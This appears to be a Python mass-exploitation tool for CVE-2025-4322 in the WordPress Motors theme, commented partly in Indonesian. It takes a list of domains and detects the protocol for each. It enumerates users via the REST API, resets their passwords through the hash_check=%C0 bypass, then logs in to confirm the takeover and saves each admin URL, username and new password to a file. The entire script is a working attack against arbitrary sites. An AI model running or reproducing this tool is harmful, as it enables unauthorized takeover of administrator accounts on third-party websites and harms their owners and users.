#!/usr/bin/env python3
"""
WordPress Motors Theme Mass Scanner - CVE-2025-4322
SUPPORT HTTP & HTTPS dengan Auto-Detect
"""

import requests
import urllib3
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# Disable SSL warnings untuk HTTPS
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN = '\033[92m'; RED = '\033[91m'; YELLOW = '\033[93m'
    BLUE = '\033[94m'; CYAN = '\033[96m'; PURPLE = '\033[95m'
    RESET = '\033[0m'; BOLD = '\033[1m'

class MotorsScannerHTTP:
    def __init__(self, password, verbose=False):
        self.password = password
        self.verbose = verbose
        self.lock = threading.Lock()
        
        self.stats = {
            'total_domains': 0,
            'domains_https': 0,
            'domains_http': 0,
            'domains_failed': 0,
            'domains_with_users': 0,
            'exploit_attempts': 0,
            'exploit_success': 0,
            'login_verified': 0,
            'captcha_blocked': 0,
            'false_positives': 0,
            'errors': 0
        }

    def log(self, message, color=Colors.RESET, level="INFO"):
        timestamp = time.strftime("%H:%M:%S")
        level_color = {
            "INFO": Colors.CYAN, "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW, "ERROR": Colors.RED,
            "VULN": Colors.PURPLE
        }.get(level, Colors.RESET)
        print(f"{Colors.BOLD}[{timestamp}]{Colors.RESET} {level_color}[{level}]{Colors.RESET} {color}{message}{Colors.RESET}")

    def detect_protocol(self, domain):
        """Detect protocol yang work untuk domain"""
        domain_clean = domain.replace('http://', '').replace('https://', '')
        
        # Jika domain sudah specify protocol, gunakan itu
        if domain.startswith('https://'):
            return 'https', domain
        elif domain.startswith('http://'):
            return 'http', domain
        
        # Auto-detect protocol
        try:
            # Coba HTTPS dulu
            response = requests.get(f"https://{domain_clean}", timeout=5, verify=False)
            if response.status_code in [200, 301, 302, 403, 401]:
                return 'https', f"https://{domain_clean}"
        except:
            pass
        
        try:
            # Fallback ke HTTP
            response = requests.get(f"http://{domain_clean}", timeout=5, verify=False)
            if response.status_code in [200, 301, 302, 403, 401]:
                return 'http', f"http://{domain_clean}"
        except:
            pass
        
        return None, None

    def get_wpapi_users(self, base_url, protocol):
        """Get users dari WP API dengan protocol yang sesuai"""
        endpoints = [
            f"{base_url}/wp-json/wp/v2/users",
            f"{base_url}/?rest_route=/wp/v2/users"
        ]
        
        for endpoint in endpoints:
            try:
                # Gunakan verify=False untuk HTTPS, tidak perlu untuk HTTP
                verify_ssl = (protocol == 'https')
                response = requests.get(endpoint, timeout=8, verify=verify_ssl)
                
                if response.status_code == 200:
                    users = response.json()
                    valid_users = []
                    
                    for user in users:
                        if isinstance(user, dict) and 'id' in user and 'slug' in user:
                            valid_users.append({
                                'id': user['id'],
                                'username': user['slug'],
                                'name': user.get('name', ''),
                                'url': user.get('url', '')
                            })
                    
                    if valid_users:
                        self.log(f"Found {len(valid_users)} users via API", Colors.GREEN)
                        return valid_users
                        
            except Exception as e:
                if self.verbose:
                    self.log(f"API Error: {e}", Colors.YELLOW, "WARNING")
                continue
        
        return []

    def detect_captcha(self, text):
        """Detect captcha presence"""
        captcha_indicators = [
            'captcha', 'recaptcha', 'hcaptcha', 'cloudflare',
            'challenge', 'security check', 'verify you are human'
        ]
        text_lower = text.lower()
        return any(indicator in text_lower for indicator in captcha_indicators)

    def verify_login_with_captcha_check(self, base_url, protocol, username, password):
        """Verify login dengan protocol support"""
        try:
            session = requests.Session()
            login_url = f"{base_url}/wp-login.php"
            
            verify_ssl = (protocol == 'https')
            
            # Get login page
            login_page = session.get(login_url, timeout=5, verify=verify_ssl)
            
            # Check captcha
            if self.detect_captcha(login_page.text):
                return "CAPTCHA_BLOCKED"
            
            # Attempt login
            login_data = {
                'log': username, 'pwd': password,
                'wp-submit': 'Log In', 'testcookie': '1'
            }
            
            response = session.post(login_url, data=login_data, timeout=10, 
                                  verify=verify_ssl, allow_redirects=True)
            
            # Check captcha di response
            if self.detect_captcha(response.text):
                return "CAPTCHA_BLOCKED"
            
            # Check login success
            checks = [
                'wp-admin' in response.url,
                'dashboard' in response.url,
                'Log Out' in response.text,
                'Howdy' in response.text,
            ]
            
            return "VERIFIED" if sum(checks) >= 2 else "LOGIN_FAILED"
            
        except Exception as e:
            return f"ERROR: {str(e)}"

    def exploit_user(self, base_url, protocol, user):
        """Attempt exploit dengan protocol support"""
        user_id = user['id']
        username = user['username']
        
        endpoints = ["/loginregister", "/login", "/register", "/my-account"]
        
        for endpoint in endpoints:
            try:
                with self.lock:
                    self.stats['exploit_attempts'] += 1
                
                target_url = f"{base_url}{endpoint}/?user_id={user_id}&hash_check=%C0"
                verify_ssl = (protocol == 'https')
                
                if self.verbose:
                    self.log(f"Trying {endpoint} for {username}", Colors.BLUE)
                
                response = requests.post(
                    target_url,
                    data={"stm_new_password": self.password},
                    timeout=10,
                    verify=verify_ssl,
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                )
                
                if response.status_code == 200:
                    with self.lock:
                        self.stats['exploit_success'] += 1
                    
                    self.log(f"Exploit successful for {username}", Colors.YELLOW, "WARNING")
                    
                    time.sleep(2)
                    
                    # Verify dengan protocol yang sesuai
                    verify_result = self.verify_login_with_captcha_check(base_url, protocol, username, self.password)
                    
                    if verify_result == "VERIFIED":
                        with self.lock:
                            self.stats['login_verified'] += 1
                        self.log(f"✅ VERIFIED: {username} @ {base_url}", Colors.GREEN, "SUCCESS")
                        return {
                            'status': 'VERIFIED', 
                            'username': username, 
                            'base_url': base_url,
                            'protocol': protocol
                        }
                    
                    elif verify_result == "CAPTCHA_BLOCKED":
                        with self.lock:
                            self.stats['captcha_blocked'] += 1
                        self.log(f"🛡️ CAPTCHA: {username} @ {base_url}", Colors.YELLOW, "WARNING")
                        return {
                            'status': 'CAPTCHA_BLOCKED', 
                            'username': username, 
                            'base_url': base_url,
                            'protocol': protocol
                        }
                    
                    else:
                        with self.lock:
                            self.stats['false_positives'] += 1
                        self.log(f"❌ FALSE: {username} @ {base_url}", Colors.RED, "ERROR")
                        return None
                        
            except Exception as e:
                if self.verbose:
                    self.log(f"Exploit error: {e}", Colors.YELLOW, "WARNING")
                continue
        
        return None

    def process_domain(self, domain):
        """Process domain dengan auto-protocol detection"""
        original_domain = domain
        
        try:
            # Detect protocol yang work
            protocol, base_url = self.detect_protocol(domain)
            
            if not protocol:
                self.log(f"❌ No working protocol for {original_domain}", Colors.RED, "ERROR")
                with self.lock:
                    self.stats['domains_failed'] += 1
                return []
            
            # Update stats berdasarkan protocol
            with self.lock:
                if protocol == 'https':
                    self.stats['domains_https'] += 1
                else:
                    self.stats['domains_http'] += 1
            
            self.log(f"Using {protocol.upper()} for {original_domain} -> {base_url}", Colors.CYAN)
            
            # Get users
            users = self.get_wpapi_users(base_url, protocol)
            if not users:
                if self.verbose:
                    self.log(f"No users found for {base_url}", Colors.YELLOW, "WARNING")
                return []

            with self.lock:
                self.stats['domains_with_users'] += 1
            
            results = []
            for user in users:
                self.log(f"Testing {user['username']} (ID:{user['id']})", Colors.BLUE)
                result = self.exploit_user(base_url, protocol, user)
                if result:
                    results.append(result)
            
            return results
            
        except Exception as e:
            with self.lock:
                self.stats['errors'] += 1
            self.log(f"Domain error: {e}", Colors.RED, "ERROR")
            return []

    def run_scan(self, domains_file, output_file):
        """Main scan function"""
        try:
            with open(domains_file, 'r') as f:
                domains = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.log(f"File {domains_file} not found!", Colors.RED, "ERROR")
            return

        self.stats['total_domains'] = len(domains)
        
        self.log(f"Starting scan of {len(domains)} domains (HTTP/HTTPS Auto-Detect)", Colors.CYAN)
        self.log(f"Password: {self.password}", Colors.CYAN)
        self.log(f"Output: {output_file}", Colors.CYAN)
        print()

        # Clear output files
        open(output_file, 'w').close()
        open('captcha_blocked.txt', 'w').close()
        open('all_results.txt', 'w').close()

        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_domain = {
                executor.submit(self.process_domain, domain): domain 
                for domain in domains
            }
            
            completed = 0
            for future in as_completed(future_to_domain):
                domain = future_to_domain[future]
                completed += 1
                
                try:
                    results = future.result(timeout=60)
                    if results:
                        for result in results:
                            line = f"{result['base_url']}/wp-admin/|{result['username']}|{self.password}\n"
                            
                            if result['status'] == 'VERIFIED':
                                with open(output_file, 'a') as f:
                                    f.write(line)
                            elif result['status'] == 'CAPTCHA_BLOCKED':
                                with open('captcha_blocked.txt', 'a') as f:
                                    f.write(line)
                            
                            with open('all_results.txt', 'a') as f:
                                f.write(f"{result['status']}|{result['protocol']}|{line}")
                    
                    # Progress update
                    progress = (completed / len(domains)) * 100
                    self.log(f"Progress: {completed}/{len(domains)} ({progress:.1f}%) - "
                           f"HTTPS:{self.stats['domains_https']} HTTP:{self.stats['domains_http']} - "
                           f"Verified:{self.stats['login_verified']}", Colors.CYAN, "INFO")
                    
                except Exception as e:
                    self.log(f"Thread error: {e}", Colors.RED, "ERROR")
                    with self.lock:
                        self.stats['errors'] += 1

        elapsed = time.time() - start_time
        self.print_summary(elapsed)

    def print_summary(self, elapsed_time):
        """Print comprehensive summary"""
        print()
        self.log("=" * 60, Colors.CYAN)
        self.log("SCAN SUMMARY WITH HTTP/HTTPS SUPPORT", Colors.CYAN, "INFO")
        self.log("=" * 60, Colors.CYAN)
        self.log(f"Total Domains       : {self.stats['total_domains']}", Colors.RESET)
        self.log(f"✅ HTTPS Working     : {self.stats['domains_https']}", Colors.GREEN)
        self.log(f"🌐 HTTP Working      : {self.stats['domains_http']}", Colors.BLUE)
        self.log(f"❌ No Protocol       : {self.stats['domains_failed']}", Colors.RED)
        self.log(f"Domains with Users  : {self.stats['domains_with_users']}", Colors.CYAN)
        self.log(f"Exploit Attempts    : {self.stats['exploit_attempts']}", Colors.CYAN)
        self.log(f"Exploit Success     : {self.stats['exploit_success']}", Colors.YELLOW)
        self.log(f"✅ Verified Exploits : {self.stats['login_verified']}", Colors.GREEN)
        self.log(f"🛡️ Captcha Blocked   : {self.stats['captcha_blocked']}", Colors.YELLOW)
        self.log(f"❌ False Positives   : {self.stats['false_positives']}", Colors.RED)
        self.log(f"Errors              : {self.stats['errors']}", Colors.RED)
        self.log(f"Time Elapsed        : {elapsed_time:.2f}s", Colors.RESET)
        self.log("=" * 60, Colors.CYAN)

def main():
    parser = argparse.ArgumentParser(description="WordPress Motors Scanner with HTTP/HTTPS Support")
    parser.add_argument("-l", "--list", required=True, help="Domains list file (supports http:// and https://)")
    parser.add_argument("-o", "--output", default="vuln.txt", help="Output file for verified exploits")
    parser.add_argument("-p", "--password", required=True, help="Password for exploited accounts")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose mode")
    
    args = parser.parse_args()
    
    scanner = MotorsScannerHTTP(args.password, args.verbose)
    scanner.run_scan(args.list, args.output)

if __name__ == "__main__":
    main()
